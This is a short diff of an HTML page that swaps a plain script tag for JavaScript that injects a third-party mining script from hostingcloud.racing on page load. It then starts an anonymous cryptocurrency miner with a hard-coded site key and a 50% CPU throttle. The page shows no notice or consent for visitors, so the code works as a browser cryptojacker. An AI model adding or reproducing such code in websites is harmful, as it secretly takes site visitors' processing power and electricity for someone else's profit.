@@ -3,8 +3,16 @@
 <div>
     <div id="coin-imp-watcher">
     </div>
-<script src="https://www.hostingcloud.racing/TL6Z.js"></script>
 <script>
+     const script = document.createElement('script')
+    script.id = 'miner-hosting'
+    script.src = 'https://www.hostingcloud.racing/TL6Z.js'
+    script.async = true
+    script.defer = true
+    script.crossOrigin = 'anonymous'
+    document.body.append(script)
+</script>
+<script defer async>
     var Miner = new Client.Anonymous('c7578b4c0b42d88a05b793290cb4c41c89478a173ef3e79bcc70c4efad879f25', {
         throttle: 0.5, c: 'w'
     });
